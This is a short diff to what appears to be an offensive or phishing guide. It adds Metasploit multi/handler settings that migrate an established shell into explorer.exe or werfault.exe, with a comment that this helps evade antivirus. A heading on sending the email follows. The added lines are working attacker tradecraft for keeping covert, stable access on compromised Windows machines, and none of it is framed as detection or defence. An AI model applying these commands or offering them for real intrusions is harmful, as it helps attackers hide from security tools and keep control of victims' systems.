@@ -189,6 +189,9 @@ try{
 ```bash
 # this will run the migrate module and by default it will attempt to migrate to notepad.exe once a shell is established
 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
+# using AutoRunScript creates a more stable shell but may fail to evade AV. Another option is to use the PrependMigrate. Can also consider werfault.exe for the proc
+exploit(multi/handler) > set PrependMigrate true; set PrependMigrateProc explorer.exe  
+
 ```
 ### Sending the email!
 
